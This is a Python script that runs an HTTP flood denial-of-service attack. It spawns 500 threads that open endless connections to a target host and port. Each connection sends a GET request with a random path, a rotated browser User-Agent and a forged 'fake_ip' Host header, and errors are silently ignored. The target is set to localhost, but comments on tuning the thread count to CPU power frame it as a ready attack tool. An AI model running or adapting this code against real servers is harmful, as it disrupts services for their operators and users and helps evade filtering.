import threading
import socket
import time
import random

target = "127.0.0.1"
port = 80
fake_ip = "192.162.1.2"

Packets = 0
lock = threading.Lock()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
    # Add more user-agents as needed
]

def attack():
    global Packets
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            user_agent = random.choice(user_agents)
            request = (
                "GET /{} HTTP/1.1\r\n"
                "Host: {}\r\n"
                "User-Agent: {}\r\n"
                "Connection: keep-alive\r\n"
                "\r\n"
            ).format(random.randint(1, 1000), fake_ip, user_agent)
            s.send(request.encode("ascii"))
            s.close()

            with lock:
                Packets += 1
                print("Packet sent:", Packets)
        except Exception as e:
            pass
        time.sleep(random.uniform(0.01, 0.1))  # Add a small random delay

# Adjust thread count based on your CPU power
for i in range(500):  # Increased to 500 threads
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()

# Keep main thread alive
while True:
    pass